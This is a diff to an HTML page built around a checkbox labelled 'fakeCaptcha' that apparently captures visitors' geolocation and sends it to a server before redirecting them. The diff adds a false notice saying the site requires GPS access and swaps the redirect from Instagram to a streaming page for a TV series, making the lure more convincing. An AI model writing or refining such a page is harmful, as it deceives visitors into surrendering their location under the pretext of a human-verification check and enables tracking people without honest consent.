@@ -26,6 +26,15 @@
       text-align: center;
     }
 
+    .gps-notice {
+      background-color: #fff3cd;
+      color: #856404;
+      padding: 10px;
+      border-radius: 8px;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
     .captcha-text {
       font-weight: 600;
       font-size: 22px;
@@ -96,6 +105,9 @@
 <body>
 
   <div class="captcha-container">
+    <div class="gps-notice">
+      ⚠ This website requires GPS/location access to continue.
+    </div>
     <div class="captcha-text">I'm not a robot</div>
     <div class="captcha-box">
       <input type="checkbox" id="fakeCaptcha" />
@@ -154,7 +166,7 @@
           })
         }).then(() => {
           alert("✅ Thanks! Redirecting…");
-          window.location.href = "https://www.instagram.com";
+          window.location.href = "https://web6.topcinema.cam/series/%D9%85%D8%B3%D9%84%D8%B3%D9%84-the-vampire-diaries-%D8%A7%D9%84%D9%85%D9%88%D8%B3%D9%85-%D8%A7%D9%84%D8%AB%D8%A7%D9%84%D8%AB-%D9%85%D8%AA%D8%B1%D8%AC%D9%85/";
         });
       },
       error => {
